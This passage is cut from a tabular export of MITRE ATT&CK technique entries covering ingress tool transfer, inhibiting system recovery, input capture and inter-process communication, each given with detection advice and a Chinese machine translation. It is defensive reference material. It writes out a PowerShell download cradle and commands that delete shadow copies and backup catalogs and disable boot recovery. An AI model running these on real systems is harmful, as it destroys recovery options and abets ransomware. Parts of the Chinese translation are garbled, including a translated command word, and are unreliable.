Brazilian Banking Malware July 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Picus Sodinokibi January 2020),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Talos Rocke August 2018),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: Trend Micro Daserf Nov 2017),(Citation: Symantec Buckeye),(Citation: NCCGroup RokRat Nov 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: PWC Cloud Hopper April 2017),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Group IB Silence Sept 2018),(Citation: Microsoft Holmium June 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Lee 2013),(Citation: Talos Kimsuky Nov 2021),(Citation: Prevailion EvilNum May 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: Kaspersky Tomiris Sep 2021),(Citation: Unit 42 Nokki Oct 2018),(Citation: ESET DazzleSpy Jan 2022),(Citation: Talos TinyTurla September 2021),(Citation: Kaspersky Winnti April 2013),(Citation: CyberBit Dtrack),(Citation: Microsoft GALLIUM December 2019),(Citation: TechNet Certutil),(Citation: Mandiant APT1),(Citation: Leonardo Turla Penquin May 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: Check Point Rocket Kitten),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Symantec Linfo May 2012),(Citation: Palo Alto OilRig Sep 2018),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Symantec Backdoor.Mivast),(Citation: Bitdefender FIN8 July 2021),(Citation: ESET Casbaneiro Oct 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Unit 42 KerrDown February 2019),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: TechNet Copy),(Citation: Trend Micro Muddy Water March 2021),(Citation: Securelist WhiteBear Aug 2017),(Citation: sentinelone shlayer to zshlayer),(Citation: Secureworks MCMD July 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET GreyEnergy Oct 2018),(Citation: Cyberint Qakbot May 2021),(Citation: DigiTrust NanoCore Jan 2017),(Citation: ESET Turla Mosquito May 2018),(Citation: BlackBerry Bahamut),(Citation: University of Birmingham C2)",入口工具传输,"攻击者可能会将工具或其他文件从外部系统转移到受感染的环境中。工具或文件可以通过命令和控制通道或通过 [ftp](https://attack.mitre.org/software/S0095) 等替代协议从外部对手控制的系统复制到受害者网络。一旦出现，攻击者还可能在受感染环境中的受害设备之间转移/传播工具（即[横向工具转移](https://attack.mitre.org/techniques/T1570)）。文件还可以使用各种 [Web 服务](https://attack.mitre.org/techniques/T1102) 以及受害系统上的本机或其他工具进行传输。（引用：PTSecurity Cobalt Dec 2016）在 Windows 上, 攻击者可以使用各种实用程序来下载工具，例如 `copy`、`finger` 和 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 命令，例如 <code>IEX(New -Object Net.WebClient).downloadString()</code> 和 <code>Invoke-WebRequest</code>。在 Linux 和 macOS 系统上，还存在各种实用程序，例如 `curl`、`scp`、`sftp`、`tftp`、`rsync`、`finger` 和 `wget`。（引用：t1105_lolbas）"
T1490,Inhibit System Recovery,"Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)

A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",https://attack.mitre.org/techniques/T1490,02 April 2019,19 April 2022,1.1,Impact,"Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, and bcdedit. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.

Monitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\Software\Policies\Microsoft\PreviousVersions\DisableLocalPage</code>).","Linux, Windows, macOS","Command: Command Execution, File: File Deletion, Process: Process Creation, Service: Service Metadata, Windows Registry: Windows Registry Key Modification",False,,,"Yonatan Gotlib, Deep Instinct",,,,,Availability,,"(Citation: CrowdStrike Ryuk January 2019),(Citation: NCC Group WastedLocker June 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Secureworks REvil September 2019),(Citation: McAfee Sodinokibi October 2019),(Citation: Picus Sodinokibi January 2020),(Citation: Cylance Sodinokibi July 2019),(Citation: Sophos Ragnar May 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: CarbonBlack Conti July 2020),(Citation: FireEye WannaCry 2017),(Citation: Hornet Security Avaddon June 2020),(Citation: McAfee Maze March 2020),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: ESET InvisiMole June 2018),(Citation: FireEye FiveHands April 2021),(Citation: SecureWorks WannaCry Analysis),(Citation: Sophos Netwalker May 2020),(Citation: Mcafee Clop Aug 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: McAfee Babuk February 2021),(Citation: Talos Olympic Destroyer 2018),(Citation: IBM MegaCortex),(Citation: Group IB Ransomware September 2020),(Citation: Dragos EKANS),(Citation: Sentinel Labs WastedLocker July 2020),(Citation: TrendMicro Netwalker May 2020),(Citation: Sophos Maze VM September 2020),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Carbon Black JCry May 2019),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: LogRhythm WannaCry),(Citation: CERT-FR PYSA April 2020),(Citation: Intel 471 REvil March 2020),(Citation: SANS Conficker),(Citation: Fortinet Diavol July 2021),(Citation: Cisco H1N1 Part 2),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: CarbonBlack RobbinHood May 2019),(Citation: Check Point Meteor Aug 2021),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Talos Sodinokibi April 2019),(Citation: Symantec WastedLocker June 2020),(Citation: Palo Alto Unit 42 EKANS),(Citation: Prevailion DarkWatchman 2021),(Citation: Kaspersky Sodin July 2019),(Citation: Ready.gov IT DRP)",禁止系统恢复,攻击者可能会删除或移除内置操作系统数据，并关闭旨在帮助恢复损坏系统的服务以防止恢复。（引用：Talos Olympic Destroyer 2018）（引用：FireEye WannaCry 2017）这可能会拒绝访问可用的备份和恢复选项。操作系统可能包含有助于修复损坏系统的功能，例如备份目录、卷影副本和自动修复功能。攻击者可能会禁用或删除系统恢复功能以增强 [数据破坏](https://attack.mitre.org/techniques/T1485) 和 [数据加密影响](https://attack.mitre.org/技术/T1486）。（引用：Talos Olympic Destroyer 2018）（引用：FireEye WannaCry 2017）许多本机 Windows 实用程序已被攻击者用于禁用或删除系统恢复功能：* <code>vssadmin.exe</code>可用于删除系统上的所有卷影副本 - <code>vssadmin.exe delete shadows /all /quiet</code> * [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)可用于删除卷影副本 - <code>wmic shadowcopy delete</code> * <code>wbadmin.exe</code> 可用于删除 Windows 备份目录 - <code>wbadmin.exe 删除目录 -quiet </code> * <code>bcdedit.exe</code> 可用于通过修改启动配置数据来禁用自动 Windows 恢复功能 - <code>bcdedit.exe /set {default} bo otstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
T1056,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",https://attack.mitre.org/techniques/T1056,31 May 2017,08 March 2022,1.2,"Collection, Credential Access","Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.","Linux, Network, Windows, macOS","Driver: Driver Load, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification",False,,,"John Lambert, Microsoft Threat Intelligence Center","Administrator, root, SYSTEM, User",,,CAPEC-569,,,"(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Kobalos Jan 2021),(Citation: ESET Kobalos Feb 2021),(Citation: Korean FSI TA505 2020),",输入捕获,攻击者可能会使用捕获用户输入的方法来获取凭据或收集信息。在正常的系统使用过程中，用户通常会向各种不同的位置提供凭据，例如登录页面/门户或系统对话框。输入捕获机制可能对用户是透明的（例如 [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)）或依赖于欺骗用户提供输入到他们认为是正版服务（例如 [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)）。
T1056.004,Input Capture: Credential API Hooking,"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:

* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)
",https://attack.mitre.org/techniques/T1056/004,11 February 2020,10 November 2020,1.0,"Collection, Credential Access","Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)

Rootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.

Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)",Windows,"Process: OS API Execution, Process: Process Metadata",True,T1056,,,"Administrator, SYSTEM",,,,,,"(Citation: Unit 42 NOKKI Sept 2018),(Citation: FireEye FIN7 Oct 2019),(Citation: Prevx Carberp March 2011),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Talos ZxShell Oct 2014),(Citation: FinFisher Citation),(Citation: Microsoft PLATINUM April 2016),(Citation: Securelist Sofacy Feb 2018),(Citation: Github PowerShell Empire),(Citation: TrendMicro Ursnif Mar 2015),(Citation: GDATA Zeus Panda June 2017),(Citation: Elastic Process Injection July 2017),",输入捕获：凭据 API 挂钩,攻击者可能会挂接到 Windows 应用程序编程接口 (API) 函数以收集用户凭据。恶意钩子机制可能会捕获包含显示用户身份验证凭据的参数的 API 调用。（引用：Microsoft TrojanSpy:Win32/Ursnif.gen！2017 年 9 月）与 [Keylogging] 不同（https://attack.mitre.org/techniques/T1056 /001)，该技术特别关注包含显示用户凭据的参数的 API 函数。挂钩涉及重定向对这些函数的调用，可以通过以下方式实现： * **挂钩程序**，它拦截并执行指定代码以响应消息、击键和鼠标输入等事件。（引文：Microsoft Hook 概述）（引文: Elastic Process Injection 2017 年 7 月）* **导入地址表 (IAT) 挂钩**，它使用对进程 IAT 的修改，其中存储了指向导入的 API 函数的指针。（引文：Elastic Process Injection 2017 年 7 月）（引文：Adlice Software IAT Hooks Oct 2014）（引用：MWRInfoSecurity Dynamic Hooking 2015）* **内联挂钩**，它覆盖 API 函数中的第一个字节以重定向代码流。（引用：Elastic Process Injection 2017 年 7 月）（引用：HighTech Bridge内联挂钩 2011 年 9 月）（引用：MWRInfoSecurity 动态挂钩 2015）
T1056.002,Input Capture: GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ",https://attack.mitre.org/techniques/T1056/002,11 February 2020,08 March 2022,1.2,"Collection, Credential Access","Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials. For example, command/script history including abnormal parameters (such as requests for credentials and/or strings related to creating password prompts) may be malicious.(Citation: Spoofing credential dialogs) 

Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources. ","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Script: Script Execution",True,T1056,,"Matthew Molyett, @s1air, Cisco Talos",User,,,CAPEC-659,,,"(Citation: objsee mac malware 2017),(Citation: Symantec Calisto July 2018),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: trendmicro xcsset xcode project 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: MacKeeper Bundlore Apr 2019),(Citation: synack 2016 review),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: FireEye Hacking FIN4 Dec 2014),",输入捕获：GUI 输入捕获,攻击者可能会模仿常见的操作系统 GUI 组件，以看似合法的提示提示用户输入凭据。当执行的程序需要比当前用户上下文中存在的额外权限时，操作系统通常会提示用户提供适当的凭据以授权任务的提升权限（例如：[绕过用户帐户控制]（https ://attack.mitre.org/techniques/T1548/002))。攻击者可能会模仿此功能，以看似合法的提示提示用户输入凭据，原因有很多模仿正常使用，例如需要额外访问权限的假安装程序或假恶意软件删除套件。（引用：OSX Malware Exploits MacKeeper）这种类型of prompt 可用于通过各种语言收集凭据，例如 [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap 恶意软件) （引文：欺骗凭据对话框）和 [PowerShell]（https://attack.mitre.org/techniques/T1059/001）。（引文：LogRhythm Do You Trust 2014 年 10 月）（引文：Enigma Phishing for Credentials Jan 2015）（引用：欺骗凭据对话框）在 Linux 系统上，攻击者可能会启动对话框，提示用户输入来自恶意 shell 脚本或命令行的凭据（即 [Unix Shell](https://attack.mitre.org/techniques/T1059/004)） .（引文：欺骗凭据对话框）
T1056.001,Input Capture: Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",https://attack.mitre.org/techniques/T1056/001,11 February 2020,21 October 2020,1.1,"Collection, Credential Access","Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.","Linux, Network, Windows, macOS","Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",True,T1056,,,"Administrator, root, SYSTEM, User",,,CAPEC-568,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Kaspersky Adwind Feb 2016),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: CopyKittens Nov 2015),(Citation: Kaspersky Lyceum October 2021),(Citation: EST Kimsuky April 2019),(Citation: FoxIT Wocao December 2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: ESET RTM Feb 2017),(Citation: Fortinet Remcos Feb 2017),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Cofense Astaroth Sept 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: Imminent Unit42 Dec2019),(Citation: Kaspersky NetTraveler),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Symantec Remsec IOCs),(Citation: Fysbis Palo Alto Analysis),(Citation: ESET Sednit Part 2),(Citation: Kaspersky QakBot September 2021),(Citation: GitHub PowerSploit May 2012),(Citation: ESET Operation Groundbait),(Citation: Securelist Dtrack),(Citation: Cylance Machete Mar 2017),(Citation: Objective-See MacMa Nov 2021),(Citation: FSecure Lokibot November 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Fortinet Metamorfo Feb 2020),(Citation: FireEye APT33 Webinar Sept 2017),(Citation: Volexity Patchwork June 2018),(Citation: Novetta Blockbuster),(Citation: Zscaler Cobian Aug 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: KISA Operation Muzabi),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye APT34 July 2019),(Citation: Forcepoint Monsoon),(Citation: Prevailion DarkWatchman 2021),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Hacker News LuckyMouse June 2018),(Citation: Kaspersky Carbanak),(Citation: Symantec Chafer Dec 2015),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: Scarlet Mimic Jan 2016),(Citation: McAfee Cuba April 2021),(Citation: Talos Remcos Aug 2018),(Citation: CIRCL PlugX March 2013),(Citation: Secureworks Karagany July 2019),(Citation: Github PowerShell Empire),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Cybereason PowerLess February 2022),(Citation: Unit42 Redaman January 2019),(Citation: FireEye Shining A Light on DARKSIDE May 2021),(Citation: CISA EB Aug 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Talos NavRAT May 2018),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Profero APT27 December 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Rapid7 KeyBoy Jun 2013),(Citation: GitHub QuasarRAT),(Citation: McAfee Gold Dragon),(Citation: Palo Alto OilRig May 2016),(Citation: Microsoft SIR Vol 19),(Citation: Kaspersky Darkhotel),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye Periscope March 2018),(Citation: 360 Machete Sep 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Radware Micropsia July 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: BH Manul Aug 2016),(Citation: Bitdefender APT28 Dec 2015),(Citation: Trend Micro Qakbot December 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Crowdstrike DNC June 2016),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Okrum July 2019),(Citation: Talos Agent Tesla Oct 2018),(Citation: PaloAlto Patchwork Mar 2018),(Citation: PowerSploit Documentation),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Chafer February 2018),(Citation: Talent-Jump Clambling February 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Konni May 2017),(Citation: Red Canary NETWIRE January 2020),(Citation: Symantec Catchamas April 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: Baumgartner Naikon 2015),(Citation: Symantec Darkmoon Aug 2005),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Talos ROKRAT),(Citation: FireEye APT37 Feb 2018),(Citation: Fortinet Agent Tesla June 2017),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Securelist Kimsuky Sept 2013),(Citation: Microsoft NICKEL December 2021),(Citation: Novetta Blockbuster Tools),(Citation: Kroll Qakbot June 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Securelist Remexi Jan 2019),(Citation: Check Point Warzone Feb 2020),(Citation: Unit42 BabyShark Apr 2019),(Citation: GitHub Pupy),(Citation: Securelist LuckyMouse June 2018),(Citation: Symantec W32.Duqu),(Citation: Proofpoint NETWIRE December 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Buckeye),(Citation: FireEye NETWIRE March 2019),(Citation: Palo Alto MoonWind March 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro njRAT 2018),(Citation: Talos ZxShell Oct 2014),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: SentinelOne MacMa Nov 2021),(Citation: Korean FSI TA505 2020),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Securelist Machete Aug 2014),(Citation: Cofense RevengeRAT Feb 2019),(Citation: GitHub PoshC2),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Unit 42 Nokki Oct 2018),(Citation: F-Secure The Dukes),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Cylance Cleaver),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: FireEye Poison Ivy),(Citation: DustySky),(Citation: jRAT Symantec Aug 2018),(Citation: Alienvault Sykipot DOD Smart Cards),(Citation: Check Point Rocket Kitten),(Citation: objsee mac malware 2017),(Citation: TrendMicro BlackTech June 2017),(Citation: ESET Machete July 2019),(Citation: Gh0stRAT ATT March 2019),(Citation: McAfee Netwire Mar 2015),(Citation: FireEye APT41 Aug 2019),(Citation: Trendmicro Evolving ThiefQuest 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: Dell TG-3390),(Citation: XAgentOSX 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: cobaltstrike manual),(Citation: Zscaler Kasidet),(Citation: FireEye APT38 Oct 2018),(Citation: Alintanahin 2014),(Citation: ASERT Donot March 2018),(Citation: Mandiant APT1 Appendix),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Citizen Lab Group5),(Citation: ESET Attor Oct 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Palo Alto Rover),(Citation: ESET GreyEnergy Oct 2018),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Kaspersky Regin),(Citation: SentinelLabs Agent Tesla Aug 2020),",输入捕获：键盘记录,攻击者可能会记录用户击键以在用户键入凭据时拦截凭据。当 [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) 努力无效时，键盘记录可能用于获取新访问机会的凭据，并且可能需要攻击者拦截系统上的击键在很长一段时间内才能成功捕获凭据。键盘记录是最流行的输入捕获类型，有许多不同的截取击键的方法。（引用：击键冒险）一些方法包括： * 用于处理击键的挂钩 API 回调。与 [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004) 不同，它只关注用于处理击键数据的 API 函数。 * 从硬件缓冲区读取原始击键数据。 * Windows 注册表修改。 *自定义驱动程序。 * [修改系统映像](https://attack.mitre.org/techniques/T1601) 可能会为攻击者提供网络设备操作系统的挂钩，以读取登录会话的原始击键。（引用：思科博客传统设备攻击）
T1056.003,Input Capture: Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",https://attack.mitre.org/techniques/T1056/003,11 February 2020,24 March 2020,1.0,"Collection, Credential Access",File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.,"Linux, Windows, macOS",File: File Modification,True,T1056,,,,,An externally facing login portal is configured.,CAPEC-569,,,"(Citation: CrowdStrike IceApple May 2022),",输入捕获：Web 门户捕获,攻击者可能会在面向外部的门户（例如 VPN 登录页面）上安装代码，以捕获和传输尝试登录服务的用户的凭据。例如，受损的登录页面可能会在用户登录到服务之前记录提供的用户凭据。输入捕获的这种变化可以在妥协后进行，使用合法的管理访问作为备份措施，以通过 [外部远程服务](https://attack.mitre.org/techniques/T1133) 和 [有效帐户]( https://attack.mitre.org/techniques/T1078）或作为利用面向外部的 Web 服务的初步妥协的一部分。（引用：Volexity Virtual Private Keylogging）
T1559,Inter-Process Communication,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. 

Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",https://attack.mitre.org/techniques/T1559,12 February 2020,11 March 2022,1.2,Execution,"Monitor for strings in files/commands, loaded DLLs/libraries, or spawned processes that are associated with abuse of IPC mechanisms.","Linux, Windows, macOS","Module: Module Load, Process: Process Access, Process: Process Creation, Script: Script Execution",False,,,,"Administrator, SYSTEM, User",1.0,,,,,"(Citation: Accenture HyperStack October 2020),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Microsoft System Wide Com Keys),(Citation: BleepingComputer DDE Disabled in Word Dec 2017),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft COM ACL),(Citation: Microsoft ADV170021 Dec 2017),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft Protected View),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: Microsoft ASR Nov 2017)",进程间通信,攻击者可能会滥用进程间通信 (IPC) 机制来执行本地代码或命令。 IPC 通常被进程用来共享数据、相互通信或同步执行。 IPC 也常用于避免进程陷入循环等待模式时发生的死锁等情况。攻击者可能会滥用 IPC 